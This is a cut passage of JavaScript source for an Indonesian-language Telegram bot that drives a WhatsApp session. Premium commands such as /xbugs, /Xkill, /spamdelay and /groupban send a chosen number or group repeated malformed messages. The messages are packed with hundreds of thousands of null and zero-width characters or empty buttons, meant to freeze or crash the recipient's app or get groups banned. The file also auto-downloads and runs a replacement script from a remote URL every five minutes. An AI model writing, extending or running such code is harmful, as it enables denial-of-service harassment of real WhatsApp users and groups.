    let res = await fetch(url);
    if (!res.ok) {
      return ctx.reply("❌ Gagal mengambil data dari API.");
    }

    let buffer;
    if (typeof res.buffer === "function") {
      buffer = await res.buffer();
    } else {
      let arrayBuffer = await res.arrayBuffer();
      buffer = Buffer.from(arrayBuffer);
    }

    await ctx.replyWithPhoto({ source: buffer }, {
      caption: `✅ Ss Iphone By Blueboerd Offc ( 🕷️ )`,
      parse_mode: "Markdown"
    });
  } catch (e) {
    console.error(e);
    ctx.reply(" Terjadi kesalahan saat menghubungi API.");
  }
});
//////// -- CASE BUG BIASA --- \\\\\\\\\\\
bot.command("groupban", checkWhatsAppConnection, checkPremium, checkCommandEnabled,
 async (ctx) => {
  const chatId = ctx.chat.id;
  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
    const input = ctx.message.text.split(" ").slice(1).join(" ").trim();

    if (!input) {
        return ctx.reply(
            "🪧 ☇ Format:\n/groupban <link_undangan|group_id>\n\nContoh:\n/groupban https://chat.whatsapp.com/ABCdef123\n/groupban 123456789@g.us"
        );
    }

    let targetJid;

    try {
        const inviteRegex = /https:\/\/chat\.whatsapp\.com\/([A-Za-z0-9]+)/;
        const matchInvite = input.match(inviteRegex);

        if (matchInvite) {
            const code = matchInvite[1];

            const progressMsg = await ctx.reply("⏳ Bergabung ke grup via link...");

            const joinResult = await sock.groupAcceptInvite(code);
            targetJid = joinResult;

            await ctx.telegram.editMessageText(
                chatId,
                progressMsg.message_id,
                undefined,
                `✅ Berhasil bergabung ke grup: ${targetJid}`
            );
        } else {
            if (!input.endsWith("@g.us")) {
                return ctx.reply("❌ ID grup harus diakhiri dengan @g.us atau gunakan link undangan.");
            }
            targetJid = input;
        }
    } catch (err) {
        return ctx.reply(`❌ Gagal memproses grup: ${err.message}`);
    }

    const sent = await ctx.sendPhoto("https://files.catbox.moe/ul7sio.jpg", {
    caption: `
<blockquote>💤 MODE : BAN GROUP

🤍 User   : ${username}
🎯 Target : Group (Link)
Type   : Status
🚀 Result : READY & SENDING</blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗚𝗿𝗼𝘂𝗽ᯤ", url: `https://chat.whatsapp.com/`, style: "danger" }]],
      },
  });

  // Proses Eksekusi Spamming
  await (async () => {
    for (let i = 0; i < 20; i++) {
        await groupBan1(sock, targetJid);
        await sleep(1500);
    }
  })();

  // Update status setelah selesai
  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    sent.message_id,
    null,
    `
<blockquote>💤 MODE : BAN GROUP

🤍 User   : ${username}
🎯 Target : Group (Link)
Type   : Status
🚀 Result : SPAM COMPLETE</blockquote>
`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗚𝗿𝗼𝘂𝗽ᯤ", url: `https://wa.me/13135550002`, style: "danger" }]],
      },
    }
  );
});
bot.command("groupbanv2", checkWhatsAppConnection, checkPremium, checkCommandEnabled,
 async (ctx) => {
  const chatId = ctx.chat.id;
  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
    const input = ctx.message.text.split(" ").slice(1).join(" ").trim();

    if (!input) {
        return ctx.reply(
            "🪧 ☇ Format:\n/groupbanv2 <link_undangan|group_id>\n\nContoh:\n/groupban https://chat.whatsapp.com/ABCdef123\n/groupban 123456789@g.us"
        );
    }

    let targetJid;

    try {
        const inviteRegex = /https:\/\/chat\.whatsapp\.com\/([A-Za-z0-9]+)/;
        const matchInvite = input.match(inviteRegex);

        if (matchInvite) {
            const code = matchInvite[1];

            const progressMsg = await ctx.reply("⏳ Bergabung ke grup via link...");

            const joinResult = await sock.groupAcceptInvite(code);
            targetJid = joinResult;

            await ctx.telegram.editMessageText(
                chatId,
                progressMsg.message_id,
                undefined,
                `✅ Berhasil bergabung ke grup: ${targetJid}`
            );
        } else {
            if (!input.endsWith("@g.us")) {
                return ctx.reply("❌ ID grup harus diakhiri dengan @g.us atau gunakan link undangan.");
            }
            targetJid = input;
        }
    } catch (err) {
        return ctx.reply(`❌ Gagal memproses grup: ${err.message}`);
    }

    const sent = await ctx.sendPhoto("https://files.catbox.moe/ul7sio.jpg", {
    caption: `
<blockquote>💤 MODE : BAN GROUP

🤍 User   : ${username}
🎯 Target : Group (Link)
Type   : Status
🚀 Result : READY & SENDING</blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗚𝗿𝗼𝘂𝗽ᯤ", url: `https://chat.whatsapp.com/`, style: "danger" }]],
      },
  });

  // Proses Eksekusi Spamming
  await (async () => {
    for (let i = 0; i < 20; i++) {
        await BanGroup(sock, targetJid);
        await sleep(1500);
    }
  })();

  // Update status setelah selesai
  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    sent.message_id,
    null,
    `
<blockquote>💤 MODE : BAN GROUP

🤍 User   : ${username}
🎯 Target : Group (Link)
Type   : Status
🚀 Result : SPAM COMPLETE</blockquote>
`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗚𝗿𝗼𝘂𝗽ᯤ", url: `https://wa.me/13135550002`, style: "danger" }]],
      },
    }
  );
});
bot.command("spamdelayv2", checkWhatsAppConnection, checkPremium, checkCommandEnabled, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];

  if (!q) {
    return ctx.reply("Example: /spamdelayv2 62xxxx");
  }
  const userId = ctx.from.id.toString();
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const Name = ctx.from.username ? `@${ctx.from.username}` : userId;

  await ctx.reply(`
<blockquote>👁️ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗬𝗢𝗨𝗥 𝗧𝗔𝗥𝗚𝗘𝗧👁️
♛ ターゲット : ${q}
♛ Pengirim : ${Name}
♛ Status    : ㋡ 𝗕𝘂𝗴 𝗦𝘂𝗰𝗰𝗲𝘀𝘀 ᯤ
༒︎ •၊၊||၊|།||||།‌‌‌‌‌၊|•</blockquote>
`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [
          {
            text: "𖤐 𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁 ⚡",
            url: `https://wa.me/${q}`,
            style: "Danger"
          }
        ]
      ]
    }
  });

  (async () => {
    for (let i = 0; i < 60; i++) {
      console.log(
        chalk.red(`Send Bug delay invisible${i + 1}/60 To ${q}`)
      );
      await revalnihh(sock, target);
      await canxenvinvisdly(sock, target);
      await iXDelayASilent(sock, target);
    }
  })();
});
bot.command("xbugs", checkWhatsAppConnection, checkPremium, checkCommandEnabled, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];

  if (!q) {
    return ctx.reply("Example: /xbugs 62xxxx");
  }
  const userId = ctx.from.id.toString();
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const Name = ctx.from.username ? `@${ctx.from.username}` : userId;

  await ctx.reply(`
<blockquote>👁️ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗬𝗢𝗨𝗥 𝗧𝗔𝗥𝗚𝗘𝗧👁️
♛ ターゲット : ${q}
♛ Pengirim : ${Name}
♛ Status    : ㋡ 𝗕𝘂𝗴 𝗦𝘂𝗰𝗰𝗲𝘀𝘀 ᯤ
༒︎ •၊၊||၊|།||||།‌‌‌‌‌၊|•</blockquote>
`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [
          {
            text: "𖤐 𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁 ⚡",
            url: `https://wa.me/${q}`,
            style: "Danger"
          }
        ]
      ]
    }
  });

  (async () => {
    for (let i = 0; i < 60; i++) {
      console.log(
        chalk.red(`Send Bug xbugs${i + 1}/60 To ${q}`)
      );

            await revalnihh(sock, target);
      await canxenvinvisdly(sock, target);
      await iXDelayASilent(sock, target);
    }
  })();
});
bot.command("Xkill", checkWhatsAppConnection, checkPremium, checkCommandEnabled, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];

  if (!q) {
    return ctx.reply("Example: /Xkill 62xxxx");
  }
  const userId = ctx.from.id.toString();
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const Name = ctx.from.username ? `@${ctx.from.username}` : userId;

  await ctx.reply(`
<blockquote>👁️ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗬𝗢𝗨𝗥 𝗧𝗔𝗥𝗚𝗘𝗧👁️
♛ ターゲット : ${q}
♛ Pengirim : ${Name}
♛ Status    : ㋡ 𝗕𝘂𝗴 𝗦𝘂𝗰𝗰𝗲𝘀𝘀 ᯤ
༒︎ •၊၊||၊|།||||།‌‌‌‌‌၊|•</blockquote>
`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [
          {
            text: "𖤐 𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁 ⚡",
            url: `https://wa.me/${q}`,
            style: "Danger"
          }
        ]
      ]
    }
  });

  (async () => {
    for (let i = 0; i < 60; i++) {
      console.log(
        chalk.red(`Send Bug delay Bebas Spam ${i + 1}/60 To ${q}`)
     
       );
            await revalnihh(sock, target);
      await canxenvinvisdly(sock, target);
      await iXDelayASilent(sock, target);
    }
  })();
});
bot.command("spamdelay", checkWhatsAppConnection, checkPremium, checkCommandEnabled, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];

  if (!q) {
    return ctx.reply("Example: /spamdelay 62xxxx");
  }
  const userId = ctx.from.id.toString();
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const Name = ctx.from.username ? `@${ctx.from.username}` : userId;

  await ctx.reply(`
<blockquote>👁️ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗬𝗢𝗨𝗥 𝗧𝗔𝗥𝗚𝗘𝗧👁️
♛ ターゲット : ${q}
♛ Pengirim : ${Name}
♛ Status    : ㋡ 𝗕𝘂𝗴 𝗦𝘂𝗰𝗰𝗲𝘀𝘀 ᯤ
༒︎ •၊၊||၊|།|||||||།‌‌‌‌‌၊|•</blockquote>
`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [
          {
            text: "𖤐 𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁 ⚡",
            url: `https://wa.me/${q}`,
            style: "Danger"
          }
        ]
      ]
    }
  });

  (async () => {
    for (let i = 0; i < 30; i++) {
      console.log(
        chalk.red(`Send Bug Delay Bebas Spam ${i + 1}/30 To ${q}`)
        
      );
            await revalnihh(sock, target);
      await canxenvinvisdly(sock, target);
      await iXDelayASilent(sock, target);
      await delaycanx(sock, target);
    }
  })();
});

bot.command("spamdelayv3", checkWhatsAppConnection, checkPremium, checkCommandEnabled, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];

  if (!q) {
    return ctx.reply("Example: /spamdelayv3 62xxxx");
  }
  const userId = ctx.from.id.toString();
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const Name = ctx.from.username ? `@${ctx.from.username}` : userId;

  await ctx.reply(`
<blockquote>👁️ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗬𝗢𝗨𝗥 𝗧𝗔𝗥𝗚𝗘𝗧👁️
♛ ターゲット : ${q}
♛ Pengirim : ${Name}
♛ Status    : ㋡ 𝗕𝘂𝗴 𝗦𝘂𝗰𝗰𝗲𝘀𝘀 ᯤ
༒︎ •၊၊||၊|།||||།‌‌‌‌‌၊|•</blockquote>
`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [
          {
            text: "𖤐 𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁 ⚡",
            url: `https://wa.me/${q}`,
            style: "Danger"
          }
        ]
      ]
    }
  });

  (async () => {
    for (let i = 0; i < 30; i++) {
      console.log(
        chalk.red(`Send Bug Delay Bebas Spam ${i + 1}/30 To ${q}`)
        
      );
            await revalnihh(sock, target);
      await canxenvinvisdly(sock, target);
      await iXDelayASilent(sock, target);
      await delaycanx(sock, target);
    }
  })();
});
/// ===============================
// BLOCK CMD
// ===============================

bot.command("blockcmd", async (ctx) => {
  try {
    const args = ctx.message.text.split(" ").slice(1);

    if (!args[0]) {
      return ctx.reply(
        "Example:\n/blockcmd /crashui"
      );
    }

    let cmd = args[0].toLowerCase();

    // hapus @botusername
    if (cmd.includes("@")) {
      cmd = cmd.split("@")[0];
    }

    const db = loadDB();

    // pakai USER ID
    const userId = String(ctx.from.id);

    // init db
    if (!db.groupCmdBlock)
      db.groupCmdBlock = {};

    if (!db.groupCmdBlock[userId])
      db.groupCmdBlock[userId] = [];

    // normalize
    const blocked =
      db.groupCmdBlock[userId]
      .map(c =>
        c.toLowerCase().split("@")[0]
      );

    // cek sudah ada
    if (blocked.includes(cmd)) {
      return ctx.reply(
        "⚠️ Command sudah diblock."
      );
    }

    // save
    db.groupCmdBlock[userId].push(cmd);

    saveDB(db);

    ctx.reply(
      `✅ Berhasil block ${cmd}`
    );

  } catch (err) {
    console.log(err);
    ctx.reply("Terjadi error.");
  }
});

// ===============================
// UNBLOCK CMD
// ===============================

bot.command("unblockcmd", async (ctx) => {
  try {
    const args = ctx.message.text.split(" ").slice(1);

    if (!args[0]) {
      return ctx.reply(
        "Example:\n/unblockcmd /crashui"
      );
    }

    let cmd = args[0].toLowerCase();

    if (cmd.includes("@")) {
      cmd = cmd.split("@")[0];
    }

    const db = loadDB();

    const userId = String(ctx.from.id);

    if (!db.groupCmdBlock?.[userId]) {
      return ctx.reply(
        "❌ Tidak ada command yang diblock."
      );
    }

    db.groupCmdBlock[userId] =
      db.groupCmdBlock[userId]
      .filter(c =>
        c.toLowerCase().split("@")[0] !== cmd
      );

    saveDB(db);

    ctx.reply(
      `✅ Berhasil unblock ${cmd}`
    );

  } catch (err) {
    console.log(err);
    ctx.reply("Terjadi error.");
  }
});
//sistem auto update
bot.command("update", async (ctx) => doUpdate(ctx));

// ✅ UPDATE URL DISINI AJA (GAK DIPISAH)
const UPDATE_URL =
  "https://raw.githubusercontent.com/wow314-afk/x-vectorautoupdate/refs/heads/main/xvector.js"; // GANTI RAW URL

// ✅ foto /start
const thumbnailUp = "https://files.catbox.moe/km50ik.jpg"; // GANTI (boleh file_id juga)

// ✅ file yang mau ditimpa update (samain sama file yang dijalanin panel)
const UPDATE_FILE_PATH = "./xvector.js"; // GANTI kalau panel jalanin file lain

function downloadToFile(url, filePath) {
  return new Promise((resolve, reject) => {
    const file = fs.createWriteStream(filePath);

    https
      .get(url, (res) => {
        if (res.statusCode !== 200) {
          file.close(() => fs.unlink(filePath, () => {}));
          return reject(new Error(`HTTP_${res.statusCode}`));
        }

        res.pipe(file);

        file.on("finish", () => file.close(resolve));
      })
      .on("error", (err) => {
        file.close(() => fs.unlink(filePath, () => {}));
        reject(err);
      });
  });
}

async function doUpdate(ctx) {
  if (ctx.from.id != OWNER_IDS[0]) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
  await ctx.reply("⏳ <b>Auto Update Script...</b>\nMohon tunggu.", {
    parse_mode: "HTML",
  });

  try {
    await downloadToFile(UPDATE_URL, UPDATE_FILE_PATH);

    await ctx.reply("✅ <b>Update berhasil!</b>\n♻ <i>Restarting bot...</i>", {
      parse_mode: "HTML",
    });

    setTimeout(() => process.exit(0), 1500);
  } catch (e) {
    await ctx.reply(
      `❌ <b>Gagal update.</b>\nReason: <code>${String(e.message || e)}</code>`,
      { parse_mode: "HTML" }
    );
  }
}

// ===============================
// AUTO UPDATE SYSTEM
// ===============================
const AUTO_CHECK_INTERVAL = 5 * 60 * 1000; // 5 menit

/* getFileHash */
function getFileHash(filePath) {
  try {
    const content = fs.readFileSync(filePath);
    return crypto.createHash("md5").update(content).digest("hex");
  } catch (err) {
    return null;
  }
}

/* autoUpdateCheck */
async function autoUpdateCheck() {
  try {
    const res = await axios.get(UPDATE_URL, {
      responseType: "text",
      transformResponse: [(d) => d],
      timeout: 15000
    });

    const remoteContent = res.data;
    const remoteHash = crypto
      .createHash("md5")
      .update(remoteContent)
      .digest("hex");

    const localHash = getFileHash(UPDATE_FILE_PATH);

    if (localHash === remoteHash) {
      console.log(chalk.gray("[AutoUpdate] No changes."));
      return;
    }

    console.log(chalk.yellow("[AutoUpdate] New version detected. Updating..."));

    if (fs.existsSync(UPDATE_FILE_PATH)) {
      fs.copyFileSync(UPDATE_FILE_PATH, UPDATE_FILE_PATH + ".backup");
    }

    await downloadToFile(UPDATE_URL, UPDATE_FILE_PATH);

    console.log(chalk.green("[AutoUpdate] Updated. Restarting..."));

    setTimeout(() => process.exit(0), 1500);

  } catch (err) {
    console.log(chalk.red(`[AutoUpdate] Error: ${err.message}`));
  }
}

// cek pertama setelah 30 detik
setTimeout(autoUpdateCheck, 30 * 1000);

// cek berkala tiap 5 menit
setInterval(autoUpdateCheck, AUTO_CHECK_INTERVAL);

// ===============================
// LIST BLOCK CMD
// ===============================

bot.command("listblockcmd", async (ctx) => {
  try {
    const db = loadDB();

    const userId = String(ctx.from.id);

    const blocked =
      db.groupCmdBlock?.[userId] || [];

    if (blocked.length < 1) {
      return ctx.reply(
        "❌ Tidak ada command yang diblock."
      );
    }

    let teks = `📌 LIST BLOCK CMD\n\n`;

    blocked.forEach((cmd, i) => {
      teks += `${i + 1}. ${cmd}\n`;
    });

    ctx.reply(teks);

  } catch (err) {
    console.log(err);
    ctx.reply("Terjadi error.");
  }
});
// Perintah untuk menambahkan pengguna premium (hanya owner)
bot.command("addadmin", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply(
      "❌ Format Salah!. Example: /addadmin 12345678"
    );
  }

  const userId = args[1];

  if (adminUsers.includes(userId)) {
    return ctx.reply(`✅ Pengguna ${userId} sudah memiliki status admin.`);
  }

  adminUsers.push(userId);
  saveJSON(adminFile, adminUsers);

  return ctx.reply(`✅ Pengguna ${userId} sekarang memiliki akses admin!`);
});
bot.command("addprem", checkOwner, checkAdmin, (ctx) => {
  const args = ctx.message.text.trim().split(" "); 

  if (args.length < 2) {
    return ctx.reply("❌ Format Salah!. Example : /addprem 12345678");
  }

  const userId = args[1].toString();

  if (premiumUsers.includes(userId)) {
    return ctx.reply(`✅ Pengguna ${userId} sudah memiliki akses premium.`);
  }

  premiumUsers.push(userId);
  saveJSON(premiumFile, premiumUsers);

  return ctx.reply(`✅ Pengguna ${userId} sekarang adalah premium.`);
});
///=== comand del admin ===\\\
bot.command("deladmin", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply(
      "❌ Format Salah!. Example : /deladmin 12345678"
    );
  }

  const userId = args[1];

  if (!adminUsers.includes(userId)) {
    return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar Admin.`);
  }

  adminUsers = adminUsers.filter((id) => id !== userId);
  saveJSON(adminFile, adminUsers);

  return ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari daftar Admin.`);
});
bot.command("delprem", checkOwner, checkAdmin, (ctx) => {
  const args = ctx.message.text.trim().split(" ");

  if (args.length < 2) {
    return ctx.reply(
      "❌ Format Salah!. Example : /delprem 12345678"
    );
  }

  const userId = args[1].toString();

  if (!premiumUsers.includes(userId)) {
    return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar premium.`);
  }

  premiumUsers = premiumUsers.filter((id) => id !== userId);
  saveJSON(premiumFile, premiumUsers);

  return ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari akses premium.`);
});

// Perintah untuk mengecek status premium
bot.command("cekprem", (ctx) => {
  const userId = ctx.from.id.toString();

  if (premiumUsers.includes(userId)) {
    return ctx.reply(`✅ Anda adalah pengguna premium.`);
  } else {
    return ctx.reply(`❌ Anda bukan pengguna premium.`);
  }
});

// Command untuk pairing WhatsApp
bot.command("addsender", checkOwner, async (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return await ctx.reply("❌ Format Salah!. Example : /addsender <nomor_wa>");
  }

  let phoneNumber = args[1];
  phoneNumber = phoneNumber.replace(/[^0-9]/g, "");

  if (sock && sock.user) {
    return await ctx.reply("Whatsapp Sudah Terhubung");
  }

  try {
    const code = await sock.requestPairingCode(phoneNumber, "XVECTORR");
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;

    await ctx.replyWithPhoto(getRandomImage(), {
      caption: `
<blockquote>
┏━━━━━━━━━━━━━━━━━━━━
┃☇ 𝗡𝗼𝗺𝗼𝗿 : ${phoneNumber}
┃☇ 𝗖𝗼𝗱𝗲 : <code>${formattedCode}</code>
┗━━━━━━━━━━━━━━━━━━━━
</blockquote>
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "dєvєlσpєrs", url: "https://t.me/canxenv" }]],
      },
    });
  } catch (error) {
    console.error(chalk.red("Gagal melakukan pairing:"), error);
    await ctx.reply("❌ Gagal melakukan pairing !");
  }
});
///=== comand del sesi ===\\\\
bot.command("resetsession", (ctx) => {
  const success = deleteSession();

  if (success) {
    ctx.reply("✅ Session berhasil di hapus, silahkan connect ulang");
  } else {
    ctx.reply("❌ Tidak ada session yang tersimpan saat ini.");
  }
});
////=== Fungsi Delete Session ===\\\\\\\
function deleteSession() {
  if (fs.existsSync(sessionPath)) {
    const stat = fs.statSync(sessionPath);

    if (stat.isDirectory()) {
      fs.readdirSync(sessionPath).forEach(file => {
        fs.unlinkSync(path.join(sessionPath, file));
      });
      fs.rmdirSync(sessionPath);
      console.log('Folder session berhasil dihapus.');
    } else {
      fs.unlinkSync(sessionPath);
      console.log('File session berhasil dihapus.');
    }

    return true;
  } else {
    console.log('Session tidak ditemukan.');
    return false;
  }
}

////////// OWNER MENU \\\\\\\\\
bot.command("Status", checkOwner, checkAdmin, async (ctx) => {
  try {
    const waStatus = sock && sock.user
      ? "✅ Terhubung"
      : "❌ Tidak Terhubung";

    const message = `
<blockquote>
┏━━━━━━━━━━━━━━━━━━━━
┃ STATUS WHATSAPP
┣━━━━━━━━━━━━━━━━━━━━
┃ ⌬ STATUS : ${waStatus}
┗━━━━━━━━━━━━━━━━━━━━
</blockquote>
`;

    await ctx.reply(message, {
      parse_mode: "HTML"
    });

  } catch (error) {
    console.error("Gagal menampilkan status bot:", error);
    ctx.reply("❌ Gagal menampilkan status bot.");
  }
});
/////////////////START FUNC/////////////////////////

async function iXDelayASilent(sock, target) {
  const QueenMia = "𝖎𝖇𝖓𝖚𝖝𝖎𝖙𝖊𝖗 𝖎𝖘 𝖍𝖊𝖗𝖊"
  
  const A = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: {
            text: QueenMia
          },
          nativeFlowMessage: {
            messageParamsJson: "[".repeat(50000),
            buttons: Array.from({ length: 50000 }, () => ({}))
          }
        }
      }
    }
  };

  const Silent = {
    protocolMessage: {
      type: 9999,
      key: {
        remoteJid: "status@broadcast",
        fromMe: false,
        id: "\u0000".repeat(70000) + "\u600b".repeat(60000)
      },
      message: "\u200B".repeat(100000) + "\u0000".repeat(100000),
      timestamp: Math.floor(Date.now() / 1000)
    }
  };

  const Attack = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: {
            text: QueenMia
          },
          nativeFlowMessage: {
            buttons: Array.from({ length: 500000 }, () => ({}))
          },
          contextInfo: {
            quotedMessage: {
              stickerPackMessage: {}
            }
          }
        }
      }
    }
  };

  await sock.relayMessage(target, A, { ptcp: true });
  await sock.relayMessage(target, Silent, { ptcp: true });
  await sock.relayMessage(target, Attack, { ptcp: true });
}

async function revalnihh(sock, target) {
await sock.relayMessage(target,{
albumMessage: {
contextInfo: {
quatedMessage: {
interactiveMessage: {
body: {},
nativeFlowMessage: {
                        buttons: Array.from({ length: 380000 }, () => ({}))
                    },
}
},
mentionedJid: [
                    "0@s.whatsapp.net",
                    ...Array.from({ length: 1999 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")
]
}
}
},{}) 
}

async function canxenvinvisdly(sock, target) {
    try {
        const msg = {
            groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: "\u0000".repeat(60899),
                            format: "DEFAULT"
                        },
                        nativeFlowMessage: {
                            buttons: "search_interval_message".repeat(20000) + "\u200B".repeat(30000)
                        }
                    }
                }
            }
        };

        await sock.relayMessage(target, msg, {});
    } catch (err) {
        console.error("X Error:", err.message);
    }
}
async function BanGroup(target) {
  if (!target.endsWith('@g.us')) {
    throw '@g.us server required';
  }

  group = target;

  try {
    await sock.groupParticipantsUpdate(
      group,
      ['971500000000@s.whatsapp.net'],
      'add',
    );

    await sock.sendPresenceUpdate('composing', group);
  } catch (err) {
    console.error('error:', err);
    throw err;
  }
}
async function delaycanx(sock, target) {
    const msg = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "canx env anti redup"
                    },
                    nativeFlowMessage: {
                        name: "call_permission_request",
                        buttons: "\n" + "\u200B" + "\x10".repeat(70000)
                    },
                    contextInfo: {
                        participant: target,
                        mentionedJid: Array.from({ length: 2000 }, () =>
                            Math.floor(Math.random() * 700000) + "@s.whatsapp.net"
                        )
                    }
                }
            }
        }
    };

    
    const canx = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "canx enak ahh" + "\n".repeat(7000) 
                    },
                    contextInfo: {
                        forwardingScore: 99999,
                        isForwarded: true,
                        forwardedAiBotMessageInfo: {
                            botJid: "867051314767696@bot",
                            mentionedJid: Array.from({ length: 2000 }, () =>
                                Math.floor(Math.random() * 700000) + "@s.whatsapp.net"
                            )
                        },
                        forwardOrigin: 4
                    },
                    nativeFlowMessage: {
                        name: "carousel_message",
                        buttons: Array.from({ length: 30 }, () => ({}))
                    }
                }
            }
        }
    };

    
    await sock.relayMessage(target, msg, {});
    await sock.relayMessage(target, canx, {});
}
async function groupBan1(sock, target) {
    if (!target.endsWith("@g.us")) {
        throw new Error("@g.us server required");
    }

    const fakeNumbers = [
        "6280000000000@s.whatsapp.net",
        "14155552671@s.whatsapp.net",
        "447400000000@s.whatsapp.net",
        "61400000000@s.whatsapp.net",
        "6281234567890@s.whatsapp.net",
        "6287873499996@s.whatsapp.net",
        "6285655555555@s.whatsapp.net",
        "6289876543210@s.whatsapp.net",
        "6281111111111@s.whatsapp.net",
        "6282222222222@s.whatsapp.net",
        "6283333333333@s.whatsapp.net",
        "6284444444444@s.whatsapp.net",
        "6285555555555@s.whatsapp.net",
        "6286666666666@s.whatsapp.net",
        "6287777777777@s.whatsapp.net",
        "6288888888888@s.whatsapp.net",
        "6289999999999@s.whatsapp.net"
    ];

    const actions = ["add", "remove", "promote", "demote"];
    const fake = fakeNumbers[Math.floor(Math.random() * fakeNumbers.length)];
    const action = actions[Math.floor(Math.random() * actions.length)];

    try {
        await sock.groupParticipantsUpdate(target, [fake], action);
        return true;
    } catch (e) {
        console.log(`❌ Gagal: ${e.message}`);
        return false;
    }
}
async function ForceCloseSpam(sock, target) {
    const INVISIBLE = {
        zwsp: "\u200B",
        zwnj: "\u200C",
        zwj: "\u200D",
        feff: "\uFEFF",
        hangul: "\u3164",
        braille: "\u2800",
        mongolian: "\u180E",
        ogham: "\u1680",
        ideographic: "\u3000",
        null: "\u0000"
    };

    function generateInvisible(length) {
        const chars = Object.values(INVISIBLE);
        let result = "";
        for (let i = 0; i < length; i++) {
            result += chars[i % chars.length];
            if (i % 50 === 0 && i > 0) {
                result += chars[Math.floor(Math.random() * chars.length)];
            }
            if (i % 150 === 0 && i > 0) {
                result += "\u0000".repeat(50);
            }
        }
        return result;
    }

    function getRandomSender() {
        const devices = [
            "6281234567890", "6281234567891", "6281234567892",
            "6281234567893", "6281234567894", "6281234567895",
            "6281234567896", "6281234567897", "6281234567898",
            "6281234567899", "6281234567800", "6281234567801"
        ];
        return devices[Math.floor(Math.random() * devices.length)] + "@s.whatsapp.net";
    }

    function buildForceClosePayload() {
        const spam1 = generateInvisible(50000);
        const spam2 = generateInvisible(40000);
        const spam3 = generateInvisible(30000);
        const spam4 = generateInvisible(55000);

        return {
            botForwardedMessage: {
                message: {
                    richResponseMessage: {
                        messageType: 2,
                        submessages: [
                            {
                                messageType: 8,
                                latexMetadata: {
                                    text: "\0" + spam1 + "\u0000".repeat(40000) + spam2,
                                    expressions: [
                                        {
                                            latexExpression: "\0" + spam3 + "\u1A01".repeat(20000),
                                            width: 999999999
                                        }
                                    ]
                                }
                            },
                            {
                                messageType: 1,
                                textMessage: {
                                    text: spam4 + "\u0000".repeat(30000)
                                }
                            }
                        ],
                        contextInfo: {
                            isForwarded: true,
                            forwardOrigin: 4,
                            participant: target,
                            mentionedJid: [target, getRandomSender()],
                            forwardingScore: 999,
                            botMessageType: 2,
                            botMessageData: {
                                botId: getRandomSender(),
                                botVersion: "2.3000.1",
                                botPlatform: "ios",
                                botSignature: "MjM0NTY3ODkwMTIzNDU2Nzg5MA=="
                            }
                        }
                    }
                }
            }
        };
    }

    const sendMessage = async (retryCount = 0) => {
        try {
            const payload = buildForceClosePayload();
            const sender = getRandomSender();
            await sock.relayMessage(target, payload, {
                participant: { jid: sender }
            });
            return true;
        } catch (error) {
            if (retryCount < 5) {
                const delay = Math.min(1000 * Math.pow(2, retryCount), 10000);
                await new Promise(resolve => setTimeout(resolve, delay));
                return sendMessage(retryCount + 1);
            }
            return false;
        }
    };

    const SPAM_COUNT = 100;
    const SPAM_DELAY = 200;

    let successCount = 0;
    let failedCount = 0;

